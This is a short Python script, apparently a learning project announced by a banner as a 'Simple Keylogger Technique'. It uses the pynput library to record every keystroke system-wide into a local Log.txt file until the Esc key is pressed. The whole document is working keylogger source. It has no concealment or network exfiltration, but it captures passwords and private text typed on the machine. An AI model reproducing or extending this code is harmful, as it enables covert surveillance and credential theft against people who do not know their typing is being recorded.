print()
print('***** Welcome to Simple Keylogger Technique *****')
print('     *** Build By Mohamed Yusuf Mujawar ***      ')
print()

# Importing the required modules.
from pynput.keyboard import Key, Listener

# Creating a function to write the key to a file.
def write_key_to_file(key):
    key_data = str(key).replace("'", "")
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif key_data in ['Key.shift', 'Key.backspace']:
        key_data = ''
    with open('Log.txt', 'a') as f:
        f.write(key_data)

# Creating a function to read the key.
def on_press(key):
    write_key_to_file(key)

# Creating a function to handle key release.
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()